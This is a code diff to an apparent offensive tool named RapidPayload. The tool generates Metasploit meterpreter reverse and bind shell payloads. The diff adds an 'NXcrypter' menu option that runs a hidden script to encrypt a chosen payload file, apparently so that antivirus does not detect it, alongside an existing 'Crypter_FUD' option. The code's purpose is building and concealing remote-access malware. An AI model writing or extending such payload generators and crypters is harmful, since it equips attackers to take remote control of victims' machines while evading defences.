@@ -392,7 +392,7 @@ def RapidP():
                 RapidP()            
             legit('Android', type)            
     if select == '4':
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}Crypter_FUD\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}Crypter_FUD\n{0}[{1}{2}6{0}]{1} {2}Crypter_NXcrypter\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
         if type == '0':
             banner()			
             RapidP()
@@ -404,7 +404,19 @@ def RapidP():
             dirtt=os.getcwd()
             os.system("chmod +x "+dirtt+"/Image/.py_fud.py")
             os.system("python "+dirtt+"/Image/.py_fud.py "+namepyfud)
-            print("\n{0}{1}RapidPayload:~/Save#FUD_python_RapidPayload.py {2}".format(cyan, bold, end))                                          
+            print("\n{0}{1}RapidPayload:~/Save#FUD_python_RapidPayload.py {2}".format(cyan, bold, end))
+        elif type == '6':
+            print("\033[1m\033[36m")
+            os.system("ls")	
+            print("")
+            namepyfud1=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
+            namepyfud2=input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))            
+            dirtt=os.getcwd()
+            os.system("chmod +x "+dirtt+"/Image/.nx.py")
+            os.system("python "+dirtt+"/Image/.nx.py --file="+namepyfud1+" --out="+namepyfud2+".py")
+            print("\033[1m\033[36m")
+            os.system("ls")
+            os.system("chmod +x "+namepyfud2+".py")                                                      
         else:             
             main('Python', type)
     if select == '5':        
@@ -437,6 +449,7 @@ def RapidP():
         exit(0)
     else:
         sleep(2)
+        banner()
         RapidP()
 
 if __name__ == "__main__":
